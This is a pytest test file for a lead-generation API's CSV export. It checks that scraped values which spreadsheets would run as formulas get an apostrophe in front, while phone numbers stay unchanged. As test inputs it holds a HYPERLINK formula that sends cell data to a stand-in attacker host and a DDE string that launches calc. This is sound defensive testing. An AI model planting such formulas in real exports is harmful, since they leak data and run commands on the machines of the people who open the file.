"""Lead CSV exports must not hand scraped text to a spreadsheet as a formula."""

import csv
import io
from types import SimpleNamespace

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from apps.api.routers import leads
from apps.api.services.leadgen.db import LeadDB
from apps.api.services.leadgen.export import csv_safe, export_csv

PAYLOAD = '=HYPERLINK("http://attacker.invalid/?x="&A1,"Click")'


@pytest.fixture
def db_path(tmp_path):
    path = tmp_path / "leads.db"
    db = LeadDB(str(path))
    db.close()
    return str(path)


@pytest.fixture
def client(db_path):
    ctx = SimpleNamespace(workspace_id="ws-fixture", lead_db=lambda: LeadDB(db_path))
    app = FastAPI()
    app.include_router(leads.router)
    app.dependency_overrides[leads.require_editor] = lambda: ctx
    app.dependency_overrides[leads.current_workspace] = lambda: ctx
    with TestClient(app) as http:
        yield http


def _seed(client):
    response = client.post("/api/lead", json={
        "company": PAYLOAD,
        "city": "Pune",
        "contact_person": "@cmd",
        "notes": "-2+3",
        "phone": "+1 (555) 010-0100",
        "email": "sales@acme.example",
    })
    assert response.status_code == 200, response.text


def test_api_export_neutralizes_formula_cells_and_keeps_phone_numbers(client):
    _seed(client)

    response = client.get("/api/export/csv")

    assert response.status_code == 200, response.text
    rows = list(csv.DictReader(io.StringIO(response.text)))
    assert len(rows) == 1
    row = rows[0]
    assert row["Company"] == "'" + PAYLOAD
    assert row["Contact Person"] == "'@cmd"
    assert row["Notes"] == "'-2+3"
    # A dialable number cannot call a function, so it stays usable.
    assert row["Phone"] == "+1 (555) 010-0100"
    assert row["Email"] == "sales@acme.example"
    assert row["City"] == "Pune"


def test_cli_export_neutralizes_formula_cells(client, db_path, tmp_path):
    _seed(client)
    out = tmp_path / "export.csv"

    export_csv(LeadDB(db_path), str(out))

    with open(out, newline="", encoding="utf-8") as handle:
        rows = list(csv.DictReader(handle))
    assert rows[0]["Company"] == "'" + PAYLOAD
    assert rows[0]["Phone"] == "+1 (555) 010-0100"


@pytest.mark.parametrize("value,expected", [
    ("=1+1", "'=1+1"),
    ("+cmd|' /C calc'!A0", "'+cmd|' /C calc'!A0"),
    ("-1+SUM(A1)", "'-1+SUM(A1)"),
    ("@SUM(A1)", "'@SUM(A1)"),
    ("\tcmd", "'\tcmd"),
    ("\rcmd", "'\rcmd"),
    ("+91 98765-43210", "+91 98765-43210"),
    ("-5", "-5"),
    ("Acme = best", "Acme = best"),
    ("", ""),
    (None, ""),
    (42, 42),
    (-3.5, -3.5),
])
def test_csv_safe(value, expected):
    assert csv_safe(value) == expected
